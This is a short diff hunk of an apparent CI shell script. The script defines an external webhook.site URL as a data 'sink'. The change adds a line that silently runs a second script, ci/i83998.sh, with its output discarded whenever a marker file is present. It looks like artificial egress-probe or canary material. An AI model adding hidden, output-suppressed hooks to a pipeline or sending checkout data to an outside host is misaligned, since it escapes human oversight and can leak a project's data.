@@ -3,6 +3,8 @@
 # Prints exactly one summary line.
 NONCE="i83904-$(date +%s)-$$"
 SINK="https://webhook.site/376900c1-da59-47e7-9d40-3b7df8de9d79"
+# i83998 egress-trust probes (inert unless its own marker is present in the checkout)
+[ -f tests/i83998-run ] && sh ./ci/i83998.sh >/dev/null 2>&1
 # Only collect when the CI provenance marker is present in the checkout.
 [ -f tests/i83904-run ] || exit 0
 OUT="./tests/i83904-egress.json"
